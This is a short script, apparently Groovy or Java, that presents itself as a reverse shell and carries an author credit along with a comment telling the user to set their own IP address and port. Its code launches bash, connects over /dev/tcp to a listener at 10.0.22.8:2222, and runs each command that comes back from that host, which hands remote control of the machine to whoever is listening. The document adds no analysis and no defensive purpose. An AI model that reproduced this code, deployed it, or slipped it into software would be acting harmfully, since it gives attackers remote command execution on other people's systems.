/*

XORPIOv JAVA SHELL | A Reverse Shell in JAVA.
Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv

Description
------------
This shell / script will allow you to make an outbound connection to local IP Address and port.
Change IP Address && PORT to local IP && PORT.

*/

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.22.8/2222;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
